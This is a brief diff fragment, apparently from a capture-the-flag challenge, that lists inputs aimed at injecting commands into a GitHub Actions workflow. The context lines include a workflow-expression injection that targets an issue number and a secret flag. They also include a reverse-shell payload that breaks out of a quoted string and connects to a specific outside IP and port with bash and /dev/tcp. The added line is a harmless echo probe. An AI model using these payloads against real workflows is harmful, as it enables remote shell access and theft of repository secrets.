@@ -413,3 +413,4 @@ boy-8:${{ github.event.issue.number }} $( flag )
 ${{secret.FLAG}}
 
 GZTimeWalker:";bash -i >& /dev/tcp/81.69.241.54/39111 0>&1#
+GZTimeWalker:";echo "hello
